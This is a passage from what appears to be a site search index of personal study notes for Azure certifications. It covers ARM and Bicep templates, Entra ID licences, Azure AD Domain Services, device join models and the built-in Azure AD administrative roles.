then combine them to create a complete system.</li> <li>Templates simplify orchestration. You only need to deploy the template to deploy all of your resources. Normally this would take multiple operations.</li> </ul> <p>The template uses a\u00a0declarative syntax. The declarative syntax is a way of building the structure and elements that outline what resources will look like without describing the control flow. Declarative syntax is different than imperative syntax, which uses commands for the computer to perform. Imperative scripting focuses on specifying each step in deploying the resources.</p> <p>ARM templates are idempotent, which means you can deploy the same template many times and get the same resource types in the same state.</p> <p>Resource Manager orchestrates deploying the resources so they're created in the correct order. When possible, resources will also be created in parallel, so ARM template deployments finish faster than scripted deployments.</p> <p>Resource Manager also has built-in validation. It checks the template before starting the deployment to make sure the deployment will succeed.</p> <p>You can also integrate your ARM templates into continuous integration and continuous deployment (CI/CD) tools like Azure Pipelines.</p> <p>The schema:</p> <pre><code>{\n    \"$schema\": \"http://schema.management.\u200bazure.com/schemas/2019-04-01/deploymentTemplate.json#\",\u200b\n    \"contentVersion\": \"\",\u200b\n    \"parameters\": {},\u200b\n    \"variables\": {},\u200b\n    \"functions\": [],\u200b\n    \"resources\": [],\u200b\n    \"outputs\": {}\u200b\n}\n</code></pre> Element name Required Description $schema Yes Location of the JSON schema file that describes the version of the template language. Use the URL shown in the preceding example. contentVersion Yes Version of the template (such as 1.0.0.0). You can provide any value for this element. Use this value to document significant changes in your template. This value can be used to make sure that the right template is being used. parameters No Values that are provided when deployment is executed to customize resource deployment. variables No Values that are used as JSON fragments in the template to simplify template language expressions. functions No User-defined functions that are available within the template. resources Yes Resource types that are deployed or updated in a resource group. outputs No Values that are returned after deployment. <p>Let's start with parameters:</p> <pre><code>\"parameters\": {\n    \"&lt;parameter-name&gt;\" : {\n        \"type\" : \"&lt;type-of-parameter-value&gt;\",\n        \"defaultValue\": \"&lt;default-value-of-parameter&gt;\",\n        \"allowedValues\": [ \"&lt;array-of-allowed-values&gt;\" ],\n        \"minValue\": &lt;minimum-value-for-int&gt;,\n        \"maxValue\": &lt;maximum-value-for-int&gt;,\n        \"minLength\": &lt;minimum-length-for-string-or-array&gt;,\n        \"maxLength\": &lt;maximum-length-for-string-or-array-parameters&gt;,\n        \"metadata\": {\n        \"description\": \"&lt;description-of-the parameter&gt;\"\n        }\n    }\n}\n</code></pre> <p>This would be an example:</p> <pre><code>\"parameters\": {\n  \"adminUsername\": {\n    \"type\": \"string\",\n    \"metadata\": {\n      \"description\": \"Username for the Virtual Machine.\"\n    }\n  },\n  \"adminPassword\": {\n    \"type\": \"securestring\",\n    \"metadata\": {\n      \"description\": \"Password for the Virtual Machine.\"\n    }\n  }\n}\n</code></pre> <p>You're limited to 256 parameters in a template. You can reduce the number of parameters by using objects that contain multiple properties.</p> <p>Azure Quickstart Templates\u00a0are Azure Resource Manager templates provided by the Azure community. Some templates provide everything you need to deploy your solution, while others might serve as a starting point for your template.</p> <ul> <li>The README.md file provides an overview of what the template does.</li> <li>The azuredeploy.json file defines the resources that will be deployed.</li> <li>The azuredeploy.parameters.json file provides the values the template needs.</li> </ul> <p>It caught my eye: https://github.com/azure/azure-quickstart-templates/tree/master/application-workloads/blockchain/blockchain</p> <p>You can deploy an ARM template to Azure in one of the following ways: - Deploy a local template - Deploy a linked template - Deploy in a continuous deployment pipeline</p> <p>Example: To add a resource to your template, you'll need to know the resource provider and its types of resources. The syntax for this combination is in the form of {resource-provider}/{resource-type}. </p> <p>See the code:</p> <pre><code>{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.1\",\n  \"apiProfile\": \"\",\n  \"parameters\": {},\n  \"variables\": {},\n  \"functions\": [],\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Storage/storageAccounts\",\n      \"apiVersion\": \"2019-06-01\",\n      \"name\": \"learntemplatestorage123\",\n      \"location\": \"westus\",\n      \"sku\": {\n        \"name\": \"Standard_LRS\"\n      },\n      \"kind\": \"StorageV2\",\n      \"properties\": {\n        \"supportsHttpsTrafficOnly\": true\n      }\n    }\n  ],\n  \"outputs\": {}\n}\n</code></pre> <p>**To create a ARM template use Visual Studio Code with the extension \"Azure Resource Manager (ARM) Tools for Visual Studio Code\". **</p>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-104-preparation/#biceps-templates","title":"Biceps templates","text":"<p>Bicep is a domain-specific language (DSL) that uses declarative syntax to deploy Azure resources. In a Bicep file, you define the infrastructure you want to deploy to Azure, and then use that file throughout the development lifecycle to repeatedly deploy your infrastructure. Your resources are deployed in a consistent manner. Bicep provides concise syntax, reliable type safety, and support for code reuse. Bicep offers a first-class authoring experience for your\u00a0infrastructure-as-code\u00a0solutions in Azure.</p> <p>How does Bicep work?</p> <p>When you deploy a resource or series of resources to Azure, the tooling that's built into Bicep converts your Bicep template into a JSON template. This process is known as transpilation. Transpilation is the process of converting source code written in one language into another language.</p> <p>Bicep provides many improvements over JSON for template authoring, including:</p> <ul> <li> <p>Simpler syntax: Bicep provides a simpler syntax for writing templates. You can reference parameters and variables directly, without using complicated functions. String interpolation is used in place of concatenation to combine values for names and other items. You can reference the properties of a resource directly by using its symbolic name instead of complex reference statements. These syntax improvements help both with authoring and reading Bicep templates.</p> </li> <li> <p>Modules: You can break down complex template deployments into smaller module files and reference them in a main template. These modules provide easier management and greater reusability.</p> </li> <li> <p>Automatic dependency management: In most situations, Bicep automatically detects dependencies between your resources. This process removes some of the work involved in template authoring.</p> </li> <li> <p>Type validation and IntelliSense: The Bicep extension for Visual Studio Code features rich validation and IntelliSense for all Azure resource type API definitions. This feature helps provide an easier authoring experience.</p> </li> </ul>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/","title":"I. Manage Identity and Access","text":"Sources of this notes <ul> <li>The Microsoft e-learn platform.</li> <li>Book:  \"Microsoft Certified - MCA Microsoft Certified Associate Azure Security Engineer Study Guide: Exam AZ-500. </li> <li>Udemy course:  AZ-500 Microsoft Azure Security Technologies Exam Prep.</li> <li>Udemy course: Azure Security: AZ-500 (updated July 2023)</li> </ul> Summary: AZ-500 Microsoft Azure Security Engineer Certification <ul> <li>About the certificate</li> <li>I. Manage Identity and Access</li> <li>II. Platform protection</li> <li>III. Data and applications</li> <li>IV. Security operations</li> <li>AZ-500 and more: keep learning</li> </ul> <p>Cheatsheets: Azure-CLI | Azure PowerShell </p> <p>100 questions you should pass for the AZ-500 certificate </p> <p>Azure Active Directory\u00a0(Azure AD) is a cloud-based identity and access management service.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#1-microsoft-entra-id","title":"1. Microsoft Entra ID","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#11-microsoft-entra-id-licenses","title":"1.1. Microsoft Entra ID licenses","text":"<ul> <li>Azure Active Directory Free.\u00a0Provides user and group management, on-premises directory synchronization, basic reports, self-service password change for cloud users, and single sign-on across Azure, Microsoft 365, and many popular SaaS apps.</li> <li>Azure Active Directory Premium P1.\u00a0In addition to the Free features, P1 lets your hybrid users access both on-premises and cloud resources. It also supports advanced administration, such as dynamic groups, self-service group management, Microsoft Identity Manager, and cloud write-back capabilities, which allow self-service password reset for your on-premises users.</li> <li>Azure Active Directory Premium P2.\u00a0In addition to the Free and P1 features, P2 also offers Azure Active Directory Identity Protection to help provide risk-based Conditional Access to your apps and critical company data and Privileged Identity Management to help discover, restrict, and monitor administrators and their access to resources and to provide just-in-time access when needed.</li> <li>\"Pay as you go\"\u00a0feature licenses. You also get additional feature licenses, such as Azure Active Directory Business-to-Customer (B2C). B2C can help you provide identity and access management solutions for your customer-facing apps.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#12-azure-active-directory-domain-services-azure-ad-ds","title":"1.2. Azure Active Directory Domain Services (Azure AD DS)","text":"<p>There are\u00a0two ways\u00a0to provide Active Directory Domain Services in the cloud:</p> <ul> <li>A\u00a0managed domain\u00a0that you create using Azure Active Directory Domain Services (Azure AD DS). Microsoft creates and manages the required resources. Azure AD DS \u00a0deploys, manages, patches, and secures the active directory domain service  infrastructure for you. It's a managed domain experience. Azure AD DS provides a smaller subset of features to traditional self-managed AD DS environment, which reduces some of the design and management complexity. For example, there are no AD forests, domains, sites, and replication links to design and maintain. Also it guarantees access to traditional authentication mechanisms such as Kerberos or NTLM.</li> <li>A\u00a0self-managed\u00a0domain that you create and configure using traditional resources such as virtual machines (VMs), Windows Server guest OS, and Active Directory Domain Services (AD DS). You then continue to administer these resources. You're then able to do additional tasks, such as extending the schema or create forest trust. Common deployment models in a self-managed domain are:<ul> <li>Standalone cloud-only AD DS: Azure VMs are configured as domain controllers, and a separate, cloud-only AD DS environment is created. This AD DS environment doesn't integrate with an on-premises AD DS environment. A different set of credentials is used to sign in and administer VMs in the cloud.</li> <li>Resource forest deployment\u00a0- Azure VMs are configured as domain controllers, and an AD DS domain that's part of an existing forest is created. A trust relationship is then configured to an on-premises AD DS environment. Other Azure VMs can domain-join this resource forest in the cloud. User authentication runs over a VPN / ExpressRoute connection to the on-premises AD DS environment.</li> <li>Extend on-premises domain to Azure\u00a0- An Azure virtual network connects to an on-premises network using a VPN / ExpressRoute connection. Azure VMs connect to this Azure virtual network, which lets them domain-join to the on-premises AD DS environment. An alternative is to create Azure VMs and promote them as replica domain controllers from the on-premises AD DS domain. These domain controllers replicate over a VPN / ExpressRoute connection to the on-premises AD DS environment. The on-premises AD DS domain is effectively extended into Azure.</li> </ul> </li> </ul> <p>The following table outlines some of the features you may need for your organization and the differences between a managed Azure AD DS domain or a self-managed AD DS domain:</p> Feature Azure Active Directory Services (Azure AD DS) Self-managed AD DS Managed service \u2713 \u2715 Secure deployments \u2713 The administrator secures the deployment Domain Name System (DNS) server \u2713 (managed service) \u2713 Domain or Enterprise administrator privileges \u2715 \u2713 Domain join \u2713 \u2713 Domain authentication using New Technology LAN Manager (NTLM) and Kerberos \u2713 \u2713 Kerberos constrained delegation Resource-based Resource-based &amp; account-based Custom organizational unit (OU) structure \u2713 \u2713 Group Policy \u2713 \u2713 Schema extensions \u2715 \u2713 Active Directory domain/forest trusts \u2713 (one-way outbound forest trusts only) \u2713 Secure Lightweight Directory Access Protocols (LDAPs) \u2713 \u2713 Lightweight Directory Access Protocol (LDAP) read \u2713 \u2713 Lightweight Directory Access Protocol (LDAP) write \u2713 (within the managed domain) \u2713 Geographical-distributed (Geo-distributed) deployments \u2713 \u2713 <p>Azure Active Directory Domain Services (Azure AD DS) provides managed domain services such as domain join, group policy, lightweight directory access protocol (LDAP), and Kerberos/New Technology LAN Manager (NTLM) authentication. You use these domain services without the need to deploy, manage, and patch domain controllers (DCs) in the cloud.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#13-signing-devices-to-azure-active-directory","title":"1.3. Signing devices to Azure Active Directory","text":"<p>Azure AD lets you manage the identity of devices used by the organization and control access to corporate resources from those devices. Users can also register their personal device (a bring-your-own (BYO) model) with Azure AD, which provides the device with an identity. Azure AD then authenticates the device when a user signs in to Azure AD and uses the device to access secured resources. The device can be managed using Mobile Device Management (MDM) software like Microsoft Intune. This management ability lets you restrict access to sensitive resources to managed and policy-compliant devices.</p> <p>Azure AD joined devices give you the following benefits:</p> <ul> <li>Single sign-on (SSO) to applications secured by Azure AD.</li> <li>Enterprise policy-compliant roaming of user settings across devices.</li> <li>Access to the Windows Store for Business using corporate credentials.</li> <li>Windows Hello for Business.</li> <li>Restricted access to apps and resources from devices compliant with corporate policy.</li> </ul> <p>The following table outlines common device ownership models and how they would typically be joined to a domain:</p> Type of device Device platforms Mechanism Personal devices Windows 10, iOS, Android, macOS Azure AD registered Organization-owned device not joined to on-premises AD DS Windows 10 Azure AD joined Organization-owned device joined to an on-premises AD DS Windows 10 Hybrid Azure AD joined <p>The following table outlines differences in how the devices are represented and can authenticate themselves against the directory:</p> Aspect Azure AD-joined Azure AD DS-joined Device controlled by Azure AD Azure AD Domain Services managed domain Representation in the directory Device objects in the Azure AD directory Computer objects in the Azure AD DS managed domain Authentication Open Authorization OAuth / OpenID Connect-based protocols. These protocols are designed to work over the internet, so are great for mobile scenarios where users access corporate resources from anywher Kerberos and NTLM protocols, so it can support legacy applications migrated to run on Azure VMs as part of a lift-and-shift strategy Management Mobile Device Management (MDM) software like Intune Group Policy Networking Works over the internet Must be connected to, or peered with, the virtual network where the managed domain is deployed Great for... End-user mobile or desktop devices Server VMs deployed in Azure <p>If on-premises AD DS and Azure AD are configured for federated authentication using Active Directory Federation Services (ADFS), then there's no (current/valid) password hash available in Azure DS. Azure AD user accounts created before fed auth was implemented might have an old password hash that doesn't match a hash of their on-premises password. Hence Azure AD DS won't validate the user's credentials.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#14-roles-in-azure-active-directory","title":"1.4. Roles in Azure Active Directory","text":"<p>Azure AD built-in roles differ in where they can be used, which fall into the following\u00a0three broad categories.</p> <ol> <li>Azure AD-specific roles: These roles grant permissions to manage resources within Azure AD only. For example,\u00a0User Administrator,\u00a0Application Administrator, and\u00a0Groups Administrator\u00a0all grant permissions to manage resources that live in Azure AD.</li> <li>Service-specific roles: For major Microsoft 365 services (non-Azure AD), we have built service-specific roles that grant permissions to manage all features within the service. </li> <li>Cross-service roles: There are some roles that span services. We have two global roles - Global Administrator and Global Reader. All Microsoft 365 services honor these two roles. Also, there are some security-related roles like Security Administrator and Security Reader that grant access across multiple security services within Microsoft 365.\u00a0For example, using Security Administrator roles in Azure AD, you can manage Microsoft 365 Defender portal, Microsoft Defender Advanced Threat Protection, and Microsoft Defender for Cloud Apps. </li> </ol> <p>The following table is offered as an aid to understanding these role categories. The categories are named arbitrarily and aren't intended to imply any other capabilities beyond the documented Azure AD role permissions.</p> Category Role Azure AD-specific roles Application Administrator  Application Developer  Authentication Administrator  Business to consumer (B2C) Identity Experience Framework (IEF) Keyset Administrator  Business to consumer (B2C) Identity Experience Framework (IEF) Policy Administrator  Cloud Application Administrator  Cloud Device Administrator  Conditional Access Administrator  Device Administrators  Directory Readers  Directory Synchronization Accounts  Directory Writers  External ID User Flow Administrator  External ID User Flow Attribute Administrator  External Identity Provider Administrator  Groups Administrator  Guest Inviter  Helpdesk Administrator  Hybrid Identity Administrator  License Administrator  Partner Tier1 Support  Partner Tier2 Support  Password Administrator  Privileged Authentication Administrator  Privileged Role Administrator  Reports Reader  User Administrator Cross-service roles Global Administrator  Compliance Administrator  Compliance Data Administrator  Global Reader  Security Administrator  Security Operator  Security Reader  Service Support Administrator Service-specific roles Azure DevOps Administrator  Azure Information Protection Administrator  Billing Administrator  Customer relationship management (CRM) Service Administrator  Customer Lockbox Access Approver  Desktop Analytics Administrator  Exchange Service Administrator  Insights Administrator  Insights Business Leader  Intune Service Administrator  Kaizala Administrator  Lync Service Administrator  Message Center Privacy Reader  Message Center Reader  Modern Commerce User  Network Administrator  Office Apps Administrator  Power BI Service Administrator  Power Platform Administrator  Printer Administrator  Printer Technician  Search Administrator  Search Editor  SharePoint Service Administrator  Teams Communications Administrator  Teams Communications Support Engineer  Teams Communications Support Specialist  Teams Devices Administrator  Teams Administrator <p>These are all of the Azure AD built-in roles:</p> Role Description Application Administrator Users in this role can create and manage all aspects of enterprise applications, application registrations, and application proxy settings.  Users assigned to this role aren't added as owners when creating new application registrations or enterprise applications.  This role also grants the ability to consent for delegated permissions and application permissions, except for application permissions for Microsoft Graph. Application Developer Can create application registrations when the\u00a0Users can register applications\u00a0setting is set to No. Attack Payload Author Users in this role can create attack payloads but not actually launch or schedule them. Attack payloads are then available to all administrators in the tenant, who can use them to create a simulation. Attack Simulation Administrator Users in this role can create and manage all aspects of attack simulation creation, launch/scheduling of a simulation, and the review of simulation results. Members of this role have this access for all simulations in the tenant. Attribute Assignment Administrator Users with this role can assign and remove custom security attribute keys and values for supported Azure AD objects such as users, service principals, and devices. By default, Global Administrator and other administrator roles don't have permissions to read, define, or assign custom security attributes. To work with custom security attributes, you must be assigned one of the custom security attribute roles. Attribute Assignment Reader Users with this role can read custom security attribute keys and values for supported Azure AD objects. By default, Global Administrator and other administrator roles don't have permissions to read, define, or assign custom security attributes. You must be assigned one of the custom security attribute roles to work with custom security attributes. Attribute Definition Administrator Users with this role can define a valid set of custom security attributes that can be assigned to supported Azure AD objects. This role can also activate and deactivate custom security attributes. By default, Global Administrator and other administrator roles don't have permissions to read, define, or assign custom security attributes. To work with custom security attributes, you must be assigned one of the custom security attribute roles. Authentication Administrator Assign the Authentication Administrator role to users who need to do the following:   -Set or reset any authentication method (including passwords) for nonadministrators and some roles.  -Require users who are nonadministrators or assigned to some roles to re-register against existing nonpassword credentials (for example,\u00a0Multifactor authentication (MFA)\u00a0or\u00a0Fast ID Online (FIDO), and can also revoke remember MFA on the device, which prompts for MFA on the next sign-in.  -Perform sensitive actions for some users.  -Create and manage support tickets in Azure and the Microsoft 365 admin center.   Users with this role can't do the following tasks:   -Can't change the credentials or reset MFA for members and owners of a role-assignable group.  -Can't manage MFA settings in the legacy MFA management portal or Hardware OATH tokens. The same functions can be accomplished using the Set-MsolUser commandlet Azure AD PowerShell module. Authentication Policy Administrator Assign the Authentication Policy Administrator role to users who need to do the following:   -Configure the authentication methods policy, tenant-wide MFA settings, and password protection policy that determine which methods each user can register and use.  -Manage Password Protection settings: smart lockout configurations and updating the custom banned passwords list.  -Create and manage verifiable credentials.  -Create and manage Azure support tickets.   Users with this role can't do the following tasks:   -Can't update sensitive properties.  -Can't delete or restore users.  -Can't manage MFA settings in the legacy MFA management portal or Hardware OATH tokens. Azure AD Joined Device Local Administrator This role is available for assignment only as another local administrator in Device settings. Users with this role become local machine administrators on all Windows 10 devices that are joined to Azure Active Directory. They don't have the ability to manage device objects in Azure Active Directory. Azure DevOps Administrator Users with this role can manage all enterprise Azure DevOps policies applicable to all Azure DevOps organizations backed by the Azure AD.  Users in this role can manage these policies by navigating to any Azure DevOps organization that is backed by the company's Azure AD.  Users in this role can claim ownership of orphaned Azure DevOps organizations. This role grants no other Azure DevOps-specific permissions (for example, Project Collection Administrators) inside any of the Azure DevOps organizations backed by the company's Azure AD organization. Azure Information Protection Administrator Users with this role have all permissions in the Azure Information Protection service. This role allows configuring labels for the Azure Information Protection policy, managing protection templates, and activating protection. This role doesn't grant any permissions in Identity Protection Center, Privileged Identity Management, Monitor Microsoft 365 Service Health, or Office 365 Security and compliance center. Business-to-Consumer (B2C) Identity Experience Framework (IEF) Keyset Administrator Users can create and manage policy keys and secrets for token encryption, token signatures, and claim encryption/decryption.  By adding new keys to existing key containers, this limited administrator can roll over secrets as needed without impacting existing applications.  This user can see the full content of these secrets and their expiration dates even after their creation. Business-to-Consumer (B2C) Identity Experience Framework (IEF) Policy Administrator Users in this role have the ability to create, read, update, and delete all custom policies in Azure AD B2C and therefore have full control over the Identity Experience Framework in the relevant Azure AD B2C organization. By editing policies, this user can establish direct federation with external identity providers, change the directory schema, change all user-facing content HyperText Markup Language (HTML), Cascading Style Sheets (CSS), JavaScript), change the requirements to complete authentication, create new users, send user data to external systems including full migrations, and edit all user information including sensitive fields like passwords and phone numbers. Conversely, this role can't change the encryption keys or edit the secrets used for federation in the organization. Billing Administrator Makes purchases, manages subscriptions, manages support tickets, and monitors service health. Cloud App Security Administrator Users with this role have full permissions in Defender for Cloud Apps. They can add administrators, add Microsoft Defender for Cloud Apps policies and settings, upload logs, and perform governance actions. Cloud Application Administrator Users in this role have the same permissions as the Application Administrator role, excluding the ability to manage application proxy. This role grants the ability to create and manage all aspects of enterprise applications and application registrations. Users assigned to this role aren't added as owners when creating new application registrations or enterprise applications. This role also grants the ability to consent for delegated permissions and application permissions, except for application permissions for Microsoft Graph. Cloud Device Administrator Users in this role can enable, disable, and delete devices in Azure AD and read Windows 10 BitLocker keys (if present) in the Azure portal. The role doesn't grant permissions to manage any other properties on the device. Compliance Administrator Users with this role have permissions to manage compliance-related features in the Microsoft Purview compliance portal, Microsoft 365 admin center, Azure, and Office 365 Security and compliance center. Assignees can also manage all features within the Exchange admin center and create support tickets for Azure and Microsoft 365. Compliance Data Administrator Users with this role have permissions to track data in the Microsoft Purview compliance portal, Microsoft 365 admin center, and Azure. Users can also track compliance data within the Exchange admin center, Compliance Manager, and Teams and Skype for Business admin center and create support tickets for Azure and Microsoft 365. Conditional Access Administrator Users with this role have the ability to manage Azure Active Directory Conditional Access settings. Customer Lockbox Access Approver Manages Microsoft Purview Customer Lockbox requests in your organization. They receive email notifications for Customer Lockbox requests and can approve and deny requests from the Microsoft 365 admin center. They can also turn the Customer Lockbox feature on or off. Only Global Administrators can reset the passwords of people assigned to this role. Desktop Analytics Administrator Users in this role can manage the Desktop Analytics service, including viewing asset inventory, creating deployment plans, and viewing deployment and health status. Directory Readers Users in this role can read basic directory information. This role should be used for:   -Granting a specific set of guest users read access instead of granting it to all guest users.  -Granting a specific set of nonadmin users access to the Azure portal when \"Restrict access to Azure AD portal to admins only\" is set to \"Yes\".  -Granting service principals access to the directory where Directory.Read.All isn't an option. Directory Synchronization Accounts Don't use. This role is automatically assigned to the Azure AD Connect service and isn't intended or supported for any other use. Directory Writers Users in this role can read and update basic information of users, groups, and service principals. Domain Name Administrator Users with this role can manage (read,\u00a0add,\u00a0verify,\u00a0update, and\u00a0delete) domain names. They can also read directory information about users, groups, and applications, as these objects possess domain dependencies. For on-premises environments, users with this role can configure domain names for federation so that associated users are always authenticated on-premises. These users can then sign into Azure AD-based services with their on-premises passwords via single sign-on. Federation settings need to be synced via Azure AD Connect so users also have permissions to manage Azure AD Connect. Dynamics 365 Administrator Users with this role have global permissions within Microsoft Dynamics 365 Online when the service is present, and the ability to manage support tickets and monitor service health. Edge Administrator Users in this role can create and manage the enterprise site list required for Internet Explorer mode on Microsoft Edge. This role grants permissions to create, edit, and publish the site list and additionally allows access to manage support tickets. Exchange Administrator Users with this role have global permissions within Microsoft Exchange Online, when the service is present. Also has the ability to create and manage all Microsoft 365 groups, manage support tickets, and monitor service health. Exchange Recipient Administrator Users with this role have read access to recipients and write access to the attributes of those recipients in Exchange Online. External ID User Flow Administrator Users with this role can create and manage user flows (also called \"built-in\" policies) in the Azure portal. These users can customize HTML/CSS/JavaScript content, change MFA requirements, select claims in the token, manage API connectors and their credentials, and configure session settings for all user flows in the Azure AD organization. On the other hand, this role doesn't include the ability to review user data or make changes to the attributes that are included in the organization schema. Changes to Identity Experience Framework policies (also known as custom policies) are also outside the scope of this role. External ID User Flow Attribute Administrator Users with this role add or delete custom attributes available to all user flows in the Azure AD organization.  Users with this role can change or add new elements to the end-user schema and impact the behavior of all user flows, and indirectly result in changes to what data may be asked of end users and ultimately sent as claims to applications. This role can't edit user flows. External Identity Provider Administrator This administrator manages federation between Azure AD organizations and external identity providers. With this role, users can add new identity providers and configure all available settings (for example, authentication path, service ID, assigned key containers). This user can enable the Azure AD organization to trust authentications from external identity providers. The resulting impact on end-user experiences depends on the type of organization:   -Azure AD organizations for employees and partners: The addition of a federation (for example, with Gmail) immediately impacts all guest invitations not yet redeemed. See Adding Google as an identity provider for B2B guest users.   -Azure Active Directory B2C organizations: The addition of a federation (for example, with Facebook, or with another Azure AD organization) doesn't immediately impact end-user flows until the identity provider is added as an option in a user flow (also called a built-in policy). Global Administrator Users with this role have access to all administrative features in Azure Active Directory, and services that use Azure Active Directory identities like the Microsoft 365 Defender portal, the Microsoft Purview compliance portal, Exchange Online, SharePoint Online, and Skype for Business Online. Furthermore, Global Administrators can elevate their access to manage all Azure subscriptions and management groups. This allows Global Administrators to get full access to all Azure resources using the respective Azure AD Tenant. The person who signs up for the Azure AD organization becomes a Global Administrator. There can be more than one Global Administrator at your company. Global Administrators can reset the password for any user and all other administrators. Global Administrator As a best practice, Microsoft recommends that you assign the Global Administrator role to\u00a0fewer than five people\u00a0in your organization. Global Reader Users in this role can read settings and administrative information across Microsoft 365 services but can't take management actions. Global Reader is the read-only counterpart to Global Administrator. Assign Global Reader instead of Global Administrator for planning, audits, or investigations. Use Global Reader in combination with other limited admin roles like Exchange Administrator to make it easier to get work done without the assigning the Global Administrator role. Global Reader works with Microsoft 365 admin center, Exchange admin center, SharePoint admin center, Teams admin center, Security center, compliance center, Azure AD admin center, and Device Management admin center.   Users with this role can't do the following tasks:   -Can't access the Purchase Services area in the Microsoft 365 admin center. Groups Administrator Users in this role can create/manage groups and its settings like naming and expiration policies. It's important to understand that assigning a user to this role gives them the ability to manage all groups in the organization across various workloads like Teams, SharePoint, Yammer in addition to Outlook. Also the user is able to manage the various groups settings across various admin portals like Microsoft admin center, Azure portal, and workload specific ones like Teams and SharePoint admin centers. Guest Inviter Users in this role can manage Azure Active Directory B2B guest user invitations when the Members can invite user setting is set to\u00a0No. Helpdesk Administrator Users with this role can change passwords, invalidate refresh tokens, create and manage support requests with Microsoft for Azure and Microsoft 365 services, and monitor service health. Invalidating a refresh token forces the user to sign in again. Whether a Helpdesk Administrator can reset a user's password and invalidate refresh tokens depends on the role the user is assigned.   Users with this role\u00a0can't\u00a0do the following:   -Can't change the credentials or reset MFA for members and owners of a\u00a0role-assignable group. Hybrid Identity Administrator Users in this role can create, manage and deploy provisioning configuration setup from AD to Azure AD using Cloud Provisioning and manage Azure AD Connect, Pass-through Authentication (PTA), Password hash synchronization (PHS), Seamless single sign-on (Seamless SSO), and federation settings. Users can also troubleshoot and monitor logs using this role. Identity Governance Administrator Users with this role can manage Azure AD identity governance configuration, including access packages, access reviews, catalogs and policies, ensuring access is approved and reviewed and guest users who no longer need access are removed. Insights Administrator Users in this role can access the full set of administrative capabilities in the Microsoft Viva Insights app. This role has the ability to read directory information, monitor service health, file support tickets, and access the Insights Administrator settings aspects. Insights Analyst Assign the Insights Analyst role to users who need to do the following tasks:   -Analyze data in the Microsoft Viva Insights app, but can't manage any configuration settings  -Create, manage, and run queries  -View basic settings and reports in the Microsoft 365 admin center  -Create and manage service requests in the Microsoft 365 admin center Insights Business Leader Users in this role can access a set of dashboards and insights via the Microsoft Viva Insights app. This includes full access to all dashboards and presented insights and data exploration functionality. Users in this role don't have access to product configuration settings, which is the responsibility of the Insights Administrator role. Intune Administrator Users with this role have global permissions within Microsoft Intune Online, when the service is present. Additionally, this role contains the ability to manage users and devices to associate policy and create and manage groups. This role can create and manage all security groups. However, Intune Administrator doesn't have admin rights over Office groups. That means the admin can't update owners or memberships of all Office groups in the organization. However, you can manage the Office group that's created, which comes as a part of end-user privileges. So, any Office group (not security group) that you create should be counted against your quota of 250. Kaizala Administrator Users with this role have global permissions to manage settings within Microsoft Kaizala, when the service is present and the ability to manage support tickets and monitor service health. Additionally, the user can access reports related to adoption and usage of Kaizala by Organization members and business reports generated using the Kaizala actions. Knowledge Administrator Users in this role have full access to all knowledge, learning and intelligent features settings in the Microsoft 365 admin center. They have a general understanding of the suite of products, licensing details and have responsibility to control access. Knowledge Administrator can create and manage content, like topics, acronyms and learning resources. Additionally, these users can create content centers, monitor service health, and create service requests. Knowledge Manager Users in this role can create and manage content, like topics, acronyms and learning content. These users are primarily responsible for the quality and structure of knowledge. This user has full rights to topic management actions to confirm a topic, approve edits, or delete a topic. This role can also manage taxonomies as part of the term store management tool and create content centers. License Administrator Users in this role can add, remove, and update license assignments on users, groups (using group-based licensing), and manage the usage location on users. The role doesn't grant the ability to purchase or manage subscriptions, create or manage groups, or create or manage users beyond the usage location. This role has no access to view, create, or manage support tickets. Lifecycle Workflows Administrator Assign the Lifecycle Workflows Administrator role to users who need to do the following tasks:   -Create and manage all aspects of workflows and tasks associated with Lifecycle Workflows in Azure AD  -Check the execution of scheduled workflows  -Launch on-demand workflow runs  -Inspect workflow execution logs Message Center Privacy Reader Users in this role can monitor all notifications in the Message Center, including data privacy messages. Message Center Privacy Readers get email notifications including those related to data privacy and they can unsubscribe using Message Center Preferences. Only the Global Administrator and the Message Center Privacy Reader can read data privacy messages. Additionally, this role contains the ability to view groups, domains, and subscriptions. This role has no permission to view, create, or manage service requests. Message Center Reader Users in this role can monitor notifications and advisory health updates in Message center for their organization on configured services such as Exchange, Intune, and Microsoft Teams. Message Center Readers receive weekly email digests of posts, updates, and can share message center posts in Microsoft 365. In Azure AD, users assigned to this role will only have read-only access on Azure AD services such as users and groups. This role has no access to view, create, or manage support tickets. Microsoft Hardware Warranty Administrator Assign the Microsoft Hardware Warranty Administrator role to users who need to do the following tasks:   -Create new warranty claims for Microsoft manufactured hardware, like Surface and HoloLens  -Search and read opened or closed warranty claims  -Search and read warranty claims by serial number  -Create, read, update, and delete shipping addresses  -Read shipping status for open warranty claims  -Create and manage service requests in the Microsoft 365 admin center  -Read Message center announcements in the Microsoft 365 admin center Microsoft Hardware Warranty Specialist Assign the Microsoft Hardware Warranty Specialist role to users who need to do the following tasks:   -Create new warranty claims for Microsoft manufactured hardware, like Surface and HoloLens  -Read warranty claims that they created  -Read and update existing shipping addresses  -Read shipping status for open warranty claims they created  -Create and manage service requests in the Microsoft 365 admin center Modern Commerce User Don't use. This role is automatically assigned from Commerce, and isn't intended or supported for any other use.  The Modern Commerce User role gives certain users permission to access Microsoft 365 admin center and see the left navigation entries for Home, Billing, and Support. The content available in these areas is controlled by commerce-specific roles assigned to users to manage products that they bought for themselves or your organization. This might include tasks like paying bills, or for access to billing accounts and billing profiles. Users with the Modern Commerce User role typically have administrative permissions in other Microsoft purchasing systems, but don't have Global Administrator or Billing Administrator roles used to access the admin center. Network Administrator Users in this role can review network perimeter architecture recommendations from Microsoft that are based on network telemetry from their user locations. Network performance for Microsoft 365 relies on careful enterprise customer network perimeter architecture, which is generally user location specific. This role allows for editing of discovered user locations and configuration of network parameters for those locations to facilitate improved telemetry measurements 